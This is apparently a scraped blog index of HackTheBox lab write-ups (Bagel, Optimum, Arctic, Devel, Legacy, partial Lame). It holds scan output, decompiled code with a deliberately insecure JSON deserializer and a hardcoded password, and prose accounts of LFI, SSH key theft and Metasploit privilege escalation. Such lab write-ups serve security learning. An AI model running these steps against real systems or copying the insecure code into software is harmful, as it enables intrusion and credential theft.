SF:20\u0026lt;a\\x20href=\\\u0026#34;http://bagel\\.htb:8000/\\?page=index\\.html\\\u0026#34;\u0026gt;http://bagel SF:\\.htb:8000/\\?page=index\\.html\u0026lt;/a\u0026gt;\\.\\x20If\\x20not,\\x20click\\x20the\\x20li SF:nk\\.\\n\u0026#34;)%r(FourOhFourRequest,184,\u0026#34;HTTP/1\\.1\\x20404\\x20NOT\\x20FOUND\\r\\nS SF:erver:\\x20Werkzeug/2\\.2\\.2\\x20Python/3\\.10\\.9\\r\\nDate:\\x20Thu,\\x2025\\x2 SF:0May\\x202023\\x2018:15:20\\x20GMT\\r\\nContent-Type:\\x20text/html;\\x20chars SF:et=utf-8\\r\\nContent-Length:\\x20207\\r\\nConnection:\\x20close\\r\\n\\r\\n\u0026lt;!doc SF:type\\x20html\u0026gt;\\n\u0026lt;html\\x20lang=en\u0026gt;\\n\u0026lt;title\u0026gt;404\\x20Not\\x20Found\u0026lt;/title\u0026gt;\\n\u0026lt; SF:h1\u0026gt;Not\\x20Found\u0026lt;/h1\u0026gt;\\n\u0026lt;p\u0026gt;The\\x20requested\\x20URL\\x20was\\x20not\\x20found SF:\\x20on\\x20the\\x20server\\.\\x20If\\x20you\\x20entered\\x20the\\x20URL\\x20manu SF:ally\\x20please\\x20check\\x20your\\x20spelling\\x20and\\x20try\\x20again\\.\u0026lt;/p SF:\u0026gt;\\n\u0026#34;)%r(Socks5,213,\u0026#34;\u0026lt;!DOCTYPE\\x20HTML\\x20PUBLIC\\x20\\\u0026#34;-//W3C//DTD\\x20HTM SF:L\\x204\\.01//EN\\\u0026#34;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\u0026#34;http://www\\.w3\\.org SF:/TR/html4/strict\\.dtd\\\u0026#34;\u0026gt;\\n\u0026lt;html\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;head\u0026gt;\\n\\x20\\x20\\x20\\ SF:x20\\x20\\x20\\x20\\x20\u0026lt;meta\\x20http-equiv=\\\u0026#34;Content-Type\\\u0026#34;\\x20content=\\\u0026#34;te SF:xt/html;charset=utf-8\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;title\u0026gt;Error\\ SF:x20response\u0026lt;/title\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;/head\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;body\u0026gt;\\n\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;h1\u0026gt;Error\\x20response\u0026lt;/h1\u0026gt;\\n\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\u0026lt;p\u0026gt;Error\\x20code:\\x20400\u0026lt;/p\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\x20\u0026lt;p\u0026gt;Message:\\x20Bad\\x20request\\x20syntax\\x20\\(\u0026#39;\\\\x05\\\\x04\\\\x0 SF:0\\\\x01\\\\x02\\\\x80\\\\x05\\\\x01\\\\x00\\\\x03\u0026#39;\\)\\.\u0026lt;/p\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\u0026lt;p\u0026gt;Error\\x20code\\x20explanation:\\x20HTTPStatus\\.BAD_REQUEST\\x20 SF:-\\x20Bad\\x20request\\x20syntax\\x20or\\x20unsupported\\x20method\\.\u0026lt;/p\u0026gt;\\n\\x2 SF:0\\x20\\x20\\x20\u0026lt;/body\u0026gt;\\n\u0026lt;/html\u0026gt;\\n\u0026#34;); Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 109.25 seconds We see 3 ports Let\u0026rsquo;s check port 8000 After scanning through web server, we detect LFI We see there are 2 users: developer and phil Foothold So let\u0026rsquo;s fire up the Burp Suite and enumerate the python app (since we saw http-server-header: Werkzeug/2.2.2 Python/3.10.9) Check /proc/self/environ Check /proc/self/cmdline We see the location of the app.py Let\u0026rsquo;s open it and see the content We see the comment in the app.py about running dotnet \u0026lt;path to .dll\u0026gt; And the websocket running on port 5000 Let\u0026rsquo;s test websocket I was stuck here for a while, since had no idea what to do next Played with different inputs to websocket But then, I remembered about the dll comment So I started utilizing the LFI to find the dll Since the port was already open means that the process with dll was already deployed Thus we scan through all processes and filter for dll We get a few hits So let\u0026rsquo;s check them After finding the location of dll, let\u0026rsquo;s download it I googled around to find a tool for decompiling the dll The app.py already had a hint with comment dotnet So I found ilspycmd which can be run on Linux OS If you have Windows machine, you can also use dnSpy Let\u0026rsquo;s decompile the dll The result Take note of password stored in DB class using System; using System.Collections.Generic; using System.Diagnostics; using System.IO; using System.Reflection; using System.Runtime.CompilerServices; using System.Runtime.Versioning; using System.Text; using System.Threading; using Microsoft.CodeAnalysis; using Microsoft.Data.SqlClient; using Newtonsoft.Json; using WatsonWebsocket; [assembly: CompilationRelaxations(8)] [assembly: RuntimeCompatibility(WrapNonExceptionThrows = true)] [assembly: Debuggable(DebuggableAttribute.DebuggingModes.Default | DebuggableAttribute.DebuggingModes.DisableOptimizations | DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints | DebuggableAttribute.DebuggingModes.EnableEditAndContinue)] [assembly: TargetFramework(\u0026#34;.NETCoreApp,Version=v6.0\u0026#34;, FrameworkDisplayName = \u0026#34;\u0026#34;)] [assembly: AssemblyCompany(\u0026#34;bagel\u0026#34;)] [assembly: AssemblyConfiguration(\u0026#34;Debug\u0026#34;)] [assembly: AssemblyFileVersion(\u0026#34;1.0.0.0\u0026#34;)] [assembly: AssemblyInformationalVersion(\u0026#34;1.0.0\u0026#34;)] [assembly: AssemblyProduct(\u0026#34;bagel\u0026#34;)] [assembly: AssemblyTitle(\u0026#34;bagel\u0026#34;)] [assembly: AssemblyVersion(\u0026#34;1.0.0.0\u0026#34;)] namespace Microsoft.CodeAnalysis { [CompilerGenerated] [Microsoft.CodeAnalysis.Embedded] internal sealed class EmbeddedAttribute : Attribute { } } namespace System.Runtime.CompilerServices { [CompilerGenerated] [Microsoft.CodeAnalysis.Embedded] [AttributeUsage(AttributeTargets.Class | AttributeTargets.Property | AttributeTargets.Field | AttributeTargets.Event | AttributeTargets.Parameter | AttributeTargets.ReturnValue | AttributeTargets.GenericParameter, AllowMultiple = false, Inherited = false)] internal sealed class NullableAttribute : Attribute { public readonly byte[] NullableFlags; public NullableAttribute(byte P_0) { NullableFlags = new byte[1] { P_0 }; } public NullableAttribute(byte[] P_0) { NullableFlags = P_0; } } [CompilerGenerated] [Microsoft.CodeAnalysis.Embedded] [AttributeUsage(AttributeTargets.Class | AttributeTargets.Struct | AttributeTargets.Method | AttributeTargets.Interface | AttributeTargets.Delegate, AllowMultiple = false, Inherited = false)] internal sealed class NullableContextAttribute : Attribute { public readonly byte Flag; public NullableContextAttribute(byte P_0) { Flag = P_0; } } } namespace bagel_server { public class Handler { public object Serialize(object obj) { //IL_0003: Unknown result type (might be due to invalid IL or missing references) //IL_0008: Unknown result type (might be due to invalid IL or missing references) //IL_0015: Expected O, but got Unknown return JsonConvert.SerializeObject(obj, (Formatting)1, new JsonSerializerSettings { TypeNameHandling = (TypeNameHandling)4 }); } public object Deserialize(string json) { //IL_0003: Unknown result type (might be due to invalid IL or missing references) //IL_0008: Unknown result type (might be due to invalid IL or missing references) //IL_0015: Expected O, but got Unknown try { return JsonConvert.DeserializeObject\u0026lt;Base\u0026gt;(json, new JsonSerializerSettings { TypeNameHandling = (TypeNameHandling)4 }); } catch { return \u0026#34;{\\\u0026#34;Message\\\u0026#34;:\\\u0026#34;unknown\\\u0026#34;}\u0026#34;; } } } public class Bagel { private static string _ServerIp = \u0026#34;*\u0026#34;; private static int _ServerPort = 5000; private static bool _Ssl = false; private static WatsonWsServer _Server = null; private static void Main(string[] args) { InitializeServer(); StartServer(); while (true) { Thread.Sleep(1000); } } private static void InitializeServer() { //IL_0010: Unknown result type (might be due to invalid IL or missing references) //IL_001a: Expected O, but got Unknown _Server = new WatsonWsServer(_ServerIp, _ServerPort, _Ssl); _Server.AcceptInvalidCertificates = true; _Server.MessageReceived += MessageReceived; } private static async void StartServer() { await _Server.StartAsync(default(CancellationToken)); } private static void MessageReceived(object sender, MessageReceivedEventArgs args) { string json = \u0026#34;\u0026#34;; if (args.Data != null \u0026amp;\u0026amp; args.Data.Count \u0026gt; 0) { json = Encoding.UTF8.GetString(args.Data.Array, 0, args.Data.Count); } Handler handler = new Handler(); object obj = handler.Deserialize(json); object obj2 = handler.Serialize(obj); _Server.SendAsync(args.IpPort, obj2.ToString(), default(CancellationToken)); } } public class Base : Orders { private int userid = 0; private string session = \u0026#34;Unauthorized\u0026#34;; public int UserId { get { return userid; } set { userid = value; } } public string Session { get { return session; } set { session = value; } } public string Time =\u0026gt; DateTime.Now.ToString(\u0026#34;h:mm:ss\u0026#34;); } public class Orders { private string order_filename; private string order_info; private File file = new File(); public object RemoveOrder { get; set; } public string WriteOrder { get { return file.WriteFile; } set { order_info = value; file.WriteFile = order_info; } } public string ReadOrder { get { return file.ReadFile; } set { order_filename = value; order_filename = order_filename.Replace(\u0026#34;/\u0026#34;, \u0026#34;\u0026#34;); order_filename = order_filename.Replace(\u0026#34;..\u0026#34;, \u0026#34;\u0026#34;); file.ReadFile = order_filename; } } } public class File { private string file_content; private string IsSuccess = null; private string directory = \u0026#34;/opt/bagel/orders/\u0026#34;; private string filename = \u0026#34;orders.txt\u0026#34;; public string ReadFile { get { return file_content; } set { filename = value; ReadContent(directory + filename); } } public string WriteFile { get { return IsSuccess; } set { WriteContent(directory + filename, value); } } public void ReadContent(string path) { try { IEnumerable\u0026lt;string\u0026gt; values = System.IO.File.ReadLines(path, Encoding.UTF8); file_content += string.Join(\u0026#34;\\n\u0026#34;, values); } catch (Exception) { file_content = \u0026#34;Order not found!\u0026#34;; } } public void WriteContent(string filename, string line) { try { System.IO.File.WriteAllText(filename, line); IsSuccess = \u0026#34;Operation successed\u0026#34;; } catch (Exception) { IsSuccess = \u0026#34;Operation failed\u0026#34;; } } } public class DB { [Obsolete(\u0026#34;The production team has to decide where the database server will be hosted. This method is not fully implemented.\u0026#34;)] public void DB_connection() { //IL_0008: Unknown result type (might be due to invalid IL or missing references) //IL_000e: Expected O, but got Unknown string text = \u0026#34;Data Source=ip;Initial Catalog=Orders;User ID=dev;Password=k8wdAYYKyhnjg3K\u0026#34;; SqlConnection val = new SqlConnection(text); string text2 = \u0026#34;INSERT INTO orders (Name,Address,Count,Type) VALUES (\u0026#39;Eliot\u0026#39;,\u0026#39;Street\u0026#39;,4,\u0026#39;Baggel\u0026#39;)\u0026#34;; } } } Okay, this was the most challenging part After scrolling through code my intuition was telling me that we can exploit deserialization Found hacktricks, systemweakness and exploit-notes.hdks.org articles The hints from the HTB forum gave me confidence that I was on the right path So I started playing around with different tools recommended in the hacktricks article that could be helpful in exploiting No luck with RCE So I knew my approach was wrong maybe I started reading other articles and systemweakness article was really helpful So we know we have a function that is responsible for deserialization Now I need to find canditates according to the article And we have one in Orders class named RemoveOrder We know we can deploy LFI based on exploit-notes.hdks.org We have a File class that we can use to achieve our goals We use File\u0026rsquo;s ReadFile and set the value to the file we want to read I started crafting payload based on the examples given in articles above and succeded Thus I didn\u0026rsquo;t fully understand the whole magic behind the exploitation and didn\u0026rsquo;t have a whole picture of exploit chain in the source code I suggest you to read 0xdf\u0026rsquo;s explanation, he has a nice exploitation map of this deserialization part Since the dll is running by a different user, we could probably read their ssh keys Let\u0026rsquo;s craft the payload to read id_rsa And we get phil's key Use the connect to the box and we get a foothold User Now we saw that there is another user: developer Let\u0026rsquo;s try the password that was stored in DB class, that we saw during decompilation Root After privescing to developer The first thing I always check is sudo rights developer can execute dotnet as root Check GTFOBins And we have a root I will check other writeups to paint the whole picture of the deserialization part since I solved it blindly So please check other writeups ","date":"June 3, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/bagel/images/bagel.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/bagel/","summary":"Bagel Enumeration nmap └─$ nmap -p22,5000,8000 -sC -sV -Pn 10.10.11.201 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-25 19:15 BST Nmap scan report for 10.10.11.201 (10.10.11.201) Host is up (0.11s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.8 (protocol 2.0) | ssh-hostkey: | 256 6e4e1341f2fed9e0f7275bededcc68c2 (ECDSA) |_ 256 80a7cd10e72fdb958b869b1b20652a98 (ED25519) 5000/tcp open upnp? | fingerprint-strings: | GetRequest: | HTTP/1.1 400 Bad Request | Server: Microsoft-NetCore/2.0 | Date: Thu, 25 May 2023 18:15:19 GMT | Connection: close | HTTPOptions: | HTTP/1.","tags":["HTB"],"title":"[HTB] Machine: Bagel"},{"categories":null,"contents":"Optimum Enumeration Nmap ┌──(kali㉿kali)-[~] └─$ nmap -sC -sV 10.10.10.8 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 19:02 BST Nmap scan report for 10.10.10.8 (10.10.10.8) Host is up (0.091s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http HttpFileServer httpd 2.3 |_http-server-header: HFS 2.3 |_http-title: HFS / Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 20.60 seconds Web server We see the version and the application running HttpFileServer 2.3 Let\u0026rsquo;s google Foothold/User Let\u0026rsquo;s copy an exploit and run I started Http server and hosted shell.ps1 And we get a shell Root Let\u0026rsquo;s start enumerating for privesc systeminfo PS C:\\Users\\kostas\\Downloads\u0026gt; systeminfo Host Name: OPTIMUM OS Name: Microsoft Windows Server 2012 R2 Standard OS Version: 6.3.9600 N/A Build 9600 OS Manufacturer: Microsoft Corporation OS Configuration: Standalone Server OS Build Type: Multiprocessor Free Registered Owner: Windows User Registered Organization: Product ID: 00252-70000-00000-AA535 Original Install Date: 18/3/2017, 1:51:36 ?? System Boot Time: 9/6/2023, 5:55:25 ?? System Manufacturer: VMware, Inc. System Model: VMware Virtual Platform System Type: x64-based PC Processor(s): 1 Processor(s) Installed. [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz BIOS Version: Phoenix Technologies LTD 6.00, 12/12/2018 Windows Directory: C:\\Windows System Directory: C:\\Windows\\system32 Boot Device: \\Device\\HarddiskVolume1 System Locale: el;Greek Input Locale: en-us;English (United States) Time Zone: (UTC+02:00) Athens, Bucharest Total Physical Memory: 4.095 MB Available Physical Memory: 3.481 MB Virtual Memory: Max Size: 5.503 MB Virtual Memory: Available: 4.932 MB Virtual Memory: In Use: 571 MB Page File Location(s): C:\\pagefile.sys Domain: HTB Logon Server: \\\\OPTIMUM Hotfix(s): 31 Hotfix(s) Installed. [01]: KB2959936 [02]: KB2896496 [03]: KB2919355 [04]: KB2920189 [05]: KB2928120 [06]: KB2931358 [07]: KB2931366 [08]: KB2933826 [09]: KB2938772 [10]: KB2949621 [11]: KB2954879 [12]: KB2958262 [13]: KB2958263 [14]: KB2961072 [15]: KB2965500 [16]: KB2966407 [17]: KB2967917 [18]: KB2971203 [19]: KB2971850 [20]: KB2973351 [21]: KB2973448 [22]: KB2975061 [23]: KB2976627 [24]: KB2977629 [25]: KB2981580 [26]: KB2987107 [27]: KB2989647 [28]: KB2998527 [29]: KB3000850 [30]: KB3003057 [31]: KB3014442 Network Card(s): 1 NIC(s) Installed. [01]: Intel(R) 82574L Gigabit Network Connection Connection Name: Ethernet0 DHCP Enabled: No IP address(es) [01]: 10.10.10.8 Hyper-V Requirements: A hypervisor has been detected. Features required for Hyper-V will not be displayed. Sherlock.ps1 This tool is Deprecated. Have a look at Watson instead. So we can either try Watson or Sherlock I tried precompiled Watson, it didn\u0026rsquo;t work. Need to compile it myself next time So I used Sherlock PS C:\\Users\\kostas\\Downloads\u0026gt; import-module .\\sherlock.ps1 PS C:\\Users\\kostas\\Downloads\u0026gt; Find-AllVulns Title : User Mode to Ring (KiTrap0D) MSBulletin : MS10-015 CVEID : 2010-0232 Link : https://www.exploit-db.com/exploits/11199/ VulnStatus : Not supported on 64-bit systems Title : Task Scheduler .XML MSBulletin : MS10-092 CVEID : 2010-3338, 2010-3888 Link : https://www.exploit-db.com/exploits/19930/ VulnStatus : Not Vulnerable Title : NTUserMessageCall Win32k Kernel Pool Overflow MSBulletin : MS13-053 CVEID : 2013-1300 Link : https://www.exploit-db.com/exploits/33213/ VulnStatus : Not supported on 64-bit systems Title : TrackPopupMenuEx Win32k NULL Page MSBulletin : MS13-081 CVEID : 2013-3881 Link : https://www.exploit-db.com/exploits/31576/ VulnStatus : Not supported on 64-bit systems Title : TrackPopupMenu Win32k Null Pointer Dereference MSBulletin : MS14-058 CVEID : 2014-4113 Link : https://www.exploit-db.com/exploits/35101/ VulnStatus : Not Vulnerable Title : ClientCopyImage Win32k MSBulletin : MS15-051 CVEID : 2015-1701, 2015-2433 Link : https://www.exploit-db.com/exploits/37367/ VulnStatus : Not Vulnerable Title : Font Driver Buffer Overflow MSBulletin : MS15-078 CVEID : 2015-2426, 2015-2433 Link : https://www.exploit-db.com/exploits/38222/ VulnStatus : Not Vulnerable Title : \u0026#39;mrxdav.sys\u0026#39; WebDAV MSBulletin : MS16-016 CVEID : 2016-0051 Link : https://www.exploit-db.com/exploits/40085/ VulnStatus : Not supported on 64-bit systems Title : Secondary Logon Handle MSBulletin : MS16-032 CVEID : 2016-0099 Link : https://www.exploit-db.com/exploits/39719/ VulnStatus : Appears Vulnerable Title : Windows Kernel-Mode Drivers EoP MSBulletin : MS16-034 CVEID : 2016-0093/94/95/96 Link : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS1 6-034? VulnStatus : Appears Vulnerable Title : Win32k Elevation of Privilege MSBulletin : MS16-135 CVEID : 2016-7255 Link : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S ample-Exploits/MS16-135 VulnStatus : Appears Vulnerable Title : Nessus Agent 6.6.2 - 6.10.3 MSBulletin : N/A CVEID : 2017-7199 Link : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.h tml VulnStatus : Not Vulnerable I also ran wesng There were a lot of CVEs So I thought maybe I should try metasploit's local exploit suggester Created msfvenom payload for meterpreter Started msfconsole and ran multi/handler Uploaded and ran msfvenom payload from the shell we got before And booted exploit suggester We see MS16-032 Which was in Sherlock's output So I tried running it before, but had luck Upon further investigation, exploit-db exploit won\u0026rsquo;t work since it spawns the new window So I tried running metasploit's version of MS16-032 exploit Check ippsec\u0026rsquo;s video or 0xdf\u0026rsquo;s writetup regaring the MS16-032, they used Empire's version of MS16-032 script ","date":"June 3, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/optimum/images/optimum.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/optimum/","summary":"Optimum Enumeration Nmap ┌──(kali㉿kali)-[~] └─$ nmap -sC -sV 10.10.10.8 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 19:02 BST Nmap scan report for 10.10.10.8 (10.10.10.8) Host is up (0.091s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http HttpFileServer httpd 2.3 |_http-server-header: HFS 2.3 |_http-title: HFS / Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 20.","tags":["HTB"],"title":"[HTB] Machine: Optimum"},{"categories":null,"contents":"Arctic Enumeration Nmap ┌──(kali㉿kali)-[~] └─$ nmap -Pn -sC -sV 10.10.10.11 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 16:05 BST Nmap scan report for 10.10.10.11 (10.10.10.11) Host is up (0.093s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 8500/tcp open fmtp? 49154/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 148.92 seconds Only 3 ports are open Let\u0026rsquo;s check port 8500 I opened using browser After scavenging through directories, we can see interesting path We see the version and the application running After googling a bit, we can see there is a vulnerability Foothold/User So let\u0026rsquo;s try exploiting application I used CVE-2009-2265, since provides a nice description of the exploit And we get a foothold and user Root Let\u0026rsquo;s try escalating our privileges There are different ways to approach this We can use wesng Beware of the huge output from the tool Or since it\u0026rsquo;s an old box, I thought it was intended to be solved using metasploit Maybe I am wrong Download meterpreter payload generated by msfvenom And get a meterpreter shell Then we run exploit suggester We get a bunch of results Then we try running each one with a hope that we get privileged access Or you can try other kernel exploits available in this box But since it was an old box, I tried running MS10-092 I had no success (even tried doing it manually), maybe it was metasploit version problem or something else (the box was laggy and I had connection issues) You can check ippsec\u0026rsquo;s writeup, who solved it using the same vulnerability with success ","date":"May 25, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/arctic/images/arctic.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/arctic/","summary":"Arctic Enumeration Nmap ┌──(kali㉿kali)-[~] └─$ nmap -Pn -sC -sV 10.10.10.11 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 16:05 BST Nmap scan report for 10.10.10.11 (10.10.10.11) Host is up (0.093s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 8500/tcp open fmtp? 49154/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.","tags":["HTB"],"title":"[HTB] Machine: Arctic"},{"categories":null,"contents":"Devel Enumeration Nmap ──(kali㉿kali)-[~] └─$ nmap -sC -sV 10.10.10.5 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-31 15:56 BST Nmap scan report for 10.10.10.5 (10.10.10.5) Host is up (0.094s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) | 03-18-17 02:06AM \u0026lt;DIR\u0026gt; aspnet_client | 03-17-17 05:37PM 689 iisstart.htm |_03-17-17 05:37PM 184946 welcome.png | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Microsoft IIS httpd 7.5 |_http-server-header: Microsoft-IIS/7.5 |_http-title: IIS7 | http-methods: |_ Potentially risky methods: TRACE Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 20.90 seconds nmap reveals that Anonymous FTP login allowed and we see the content Let\u0026rsquo;s check ftp manually We see that the content is hosted by the http server Let\u0026rsquo;s see if we can upload the files to ftp And we get a webshell Foothold \u0026amp; Root So I decided to use metasploit in this case, since it has built-in exploit suggester So I have to upload meterpreter shell payload generated by msfvenom After getting access, I ran exploit suggester We can\u0026rsquo;t use first option, since it seems like it\u0026rsquo;s used when you want to elevate and bypass UAC So We use the next option Set the options, run the exploit and get NT Autority\\System I suggest checking 0xdf\u0026rsquo;s writeup He provides another approach for privesc ","date":"May 25, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/devel/images/devel.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/devel/","summary":"Devel Enumeration Nmap ──(kali㉿kali)-[~] └─$ nmap -sC -sV 10.10.10.5 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-31 15:56 BST Nmap scan report for 10.10.10.5 (10.10.10.5) Host is up (0.094s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) | 03-18-17 02:06AM \u0026lt;DIR\u0026gt; aspnet_client | 03-17-17 05:37PM 689 iisstart.htm |_03-17-17 05:37PM 184946 welcome.png | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Microsoft IIS httpd 7.","tags":["HTB"],"title":"[HTB] Machine: Devel"},{"categories":null,"contents":"Legacy Enumeration Nmap ┌──(kali㉿kali)-[~] └─$ nmap -Pn -sC -sV 10.10.10.4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-30 18:11 BST Nmap scan report for 10.10.10.4 (10.10.10.4) Host is up (0.17s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows XP microsoft-ds Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp Host script results: |_smb2-time: Protocol negotiation failed (SMB2) |_clock-skew: mean: 5d00h27m11s, deviation: 2h07m16s, median: 4d22h57m11s |_nbstat: NetBIOS name: LEGACY, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 005056b90f40 (VMware) | smb-os-discovery: | OS: Windows XP (Windows 2000 LAN Manager) | OS CPE: cpe:/o:microsoft:windows_xp::- | Computer name: legacy | NetBIOS computer name: LEGACY\\x00 | Workgroup: HTB\\x00 |_ System time: 2023-06-04T22:09:21+03:00 | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 62.71 seconds Nmap vulnerability scripts ┌──(kali㉿kali)-[~] └─$ nmap -Pn -p139,445,135 --script *vuln* 10.10.10.4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-30 18:17 BST Nmap scan report for 10.10.10.4 (10.10.10.4) Host is up (0.11s latency). PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds Host script results: |_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug) | smb-vuln-ms08-067: | VULNERABLE: | Microsoft Windows system vulnerable to remote code execution (MS08-067) | State: VULNERABLE | IDs: CVE:CVE-2008-4250 | The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, | Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary | code via a crafted RPC request that triggers the overflow during path canonicalization. | | Disclosure date: 2008-10-23 | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250 |_ https://technet.microsoft.com/en-us/library/security/ms08-067.aspx | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 | https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ |_ https://technet.microsoft.com/en-us/library/security/ms17-010.aspx |_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED |_smb-vuln-ms10-054: false Nmap done: 1 IP address (1 host up) scanned in 29.43 seconds Right away it states that it\u0026rsquo;s vulnerable to MS08-067 https://www.exploit-db.com/exploits/7104 Root Let\u0026rsquo;s run metasploit and execute an exploit I was lazy to search for a Github exploit And we have an access as LEGACY$ machine account ","date":"May 25, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/legacy/images/legacy.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/legacy/","summary":"Legacy Enumeration Nmap ┌──(kali㉿kali)-[~] └─$ nmap -Pn -sC -sV 10.10.10.4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-30 18:11 BST Nmap scan report for 10.10.10.4 (10.10.10.4) Host is up (0.17s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows XP microsoft-ds Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp Host script results: |_smb2-time: Protocol negotiation failed (SMB2) |_clock-skew: mean: 5d00h27m11s, deviation: 2h07m16s, median: 4d22h57m11s |_nbstat: NetBIOS name: LEGACY, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 005056b90f40 (VMware) | smb-os-discovery: | OS: Windows XP (Windows 2000 LAN Manager) | OS CPE: cpe:/o:microsoft:windows_xp::- | Computer name: legacy | NetBIOS computer name: LEGACY\\x00 | Workgroup: HTB\\x00 |_ System time: 2023-06-04T22:09:21+03:00 | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) Service detection performed.","tags":["HTB"],"title":"[HTB] Machine: Legacy"},{"categories":null,"contents":"Lame Enumeration Nmap ┌──(kali㉿kali)-[~] └─$ nmap -Pn -sC -sV 10.10.10.3 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-30 17:14 BST Nmap scan report for 10.10.10.3 (10.10.10.3) Host is up (0.10s latency). Not shown: 996 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 | ftp-syst: | STAT: | FTP server status: | Connected to 10.10.16.3 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | 